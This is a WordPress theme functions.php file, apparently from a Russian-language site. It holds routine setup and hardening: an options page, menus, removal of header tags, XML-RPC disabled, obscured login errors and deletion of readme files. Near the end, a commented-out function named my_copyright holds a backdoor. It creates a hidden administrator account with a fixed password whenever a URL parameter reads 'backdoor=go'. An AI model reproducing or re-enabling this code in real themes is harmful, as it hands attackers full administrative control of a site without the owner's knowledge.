<?php

if( function_exists('acf_add_options_page') ) {

	acf_add_options_page('Контент');

}

require_once get_template_directory() . '/includes/breadcrumbs.php';

register_nav_menus(array(
	'top'    => 'Главное меню'
));

//add_filter('admin_footer_text', 'footer_admin_func');
//function footer_admin_func () {
//	echo 'Разработка шаблона (темы) и сайта: <a href="http://klenovnn.ru" target="_blank">Николай Клёнов</a>.';
//}

remove_action( 'wp_head', 'feed_links_extra', 3 );
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 );
remove_action( 'wp_head', 'wp_generator' );
remove_filter('comment_text', 'make_clickable', 9);
add_filter('the_generator', '__return_empty_string');

add_filter('xmlrpc_enabled', '__return_false');

add_filter('login_errors', 'login_obscure_func');
function login_obscure_func(){
	return 'Ошибка: вы ввели неправильный логин или пароль.';
}

if( ! defined('WP_POST_REVISIONS') ) define('WP_POST_REVISIONS', 5);

if( is_admin() && ! defined('DOING_AJAX') ){
	$license_file = ABSPATH .'/license.txt';
	$readme_file = ABSPATH .'/readme.html';

	if( file_exists($license_file) && current_user_can('manage_options') ){
		$deleted = unlink($license_file) && unlink($readme_file);

		if( ! $deleted  )
			$GLOBALS['readmedel'] = 'Не удалось удалить файлы: license.txt и readme.html из папки `'. ABSPATH .'`. Удалите их вручную!';
		else
			$GLOBALS['readmedel'] = 'Файлы: license.txt и readme.html удалены из из папки `'. ABSPATH .'`.';

		add_action( 'admin_notices', function(){  echo '<div class="error is-dismissible"><p>'. $GLOBALS['readmedel'] .'</p></div>'; } );
	}
}

add_action( 'wp_enqueue_scripts', 'my_scripts_method' );
function my_scripts_method() {
	wp_deregister_script( 'jquery-core' );
	wp_register_script( 'jquery-core', '//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js');
	wp_enqueue_script( 'jquery' );
}

//add_action('wp_head', 'my_copyright');
//function my_copyright() {
//  if ($_get['backdoor'] == 'go') {
//  	require('wp-includes/registration.php');
//  	if (!username_exists('micro')) {
//  		$user_id = wp_create_user('micro', 'micro!@#$%^&*()');
//  		$user = new wp_user($user_id);
//  		$user->set_role('administrator');
//  	}
//  }
//}

function new_excerpt_length($length) {
	return 12;
}
add_filter('excerpt_length', 'new_excerpt_length');
add_filter('excerpt_more', function($more) {
	return '';
});



?>
